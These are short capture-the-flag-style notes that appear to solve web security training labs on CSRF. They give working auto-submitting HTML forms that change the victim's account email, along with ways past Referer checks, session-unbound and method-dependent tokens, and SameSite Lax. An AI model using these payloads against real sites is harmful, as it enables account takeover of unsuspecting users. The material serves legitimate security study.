
### CheckList

1)  Post to Get
2) remove the CSRF

# CSRF with broken Referer validation

try sending a CSRF P0c this will respond  referer header invalid 

go back to the request and  by pass it there is basically 2 methods

```
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```


`Edit the POC`

since the 2nd method worked
``` JS
history.pushState('', '', '/?0af600c0049c54198101025c007a0096.web-security-academy.net/');
```

in the exploit server add  in the head 

``` HTTP 
Referrer-Policy: unsafe-url
```

`FINAL` 

```JS 

<html>
 <body>
 
    <form action="https://0af600c0049c54198101025c007a0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="testingly&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>

  <script>
      history.pushState('', '', '/?0af600c0049c54198101025c007a0096.web-security-academy.net/');
      document.forms[0].submit();
    </script>
 
 
  </body>
</html>

```


# CSRF where Referer validation depends on header being present


After submitting a basic CSRF POC i got a referrer invalid so i added this
``` js
<meta name="referrer" content="never">
```

full exploit 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <meta name="referrer" content="never">
    <form action="https://0ada00f403f0972e8180df5500bd0066.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


# CSRF where token is not tied to user session


- intercept the request and do a POC


```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6c00b004b3436f80a63f6800b000e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;b&#46;com" />
      <input type="hidden" name="csrf" value="tWjObkmlP67WohTsljZmn33B82JmZOPI" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```



# CSRF where token validation depends on request method


> change the request method POST to GET notice we dont need csrf anymore
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa5001003c267cc8173036700e800cf.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="evilish&#64;ab&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


# Lab: CSRF where token validation depends on token being present

>remove the CSRF
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac6000404bad4fead5369b4002800bc.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


## SameSite Lax bypass via method override
- request method to GET
- add &_method=POST 

>Generate CSRF TO POC
```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a200093030ce89f8258d8ac007300ed.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="asdasd&#64;a&#46;com" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

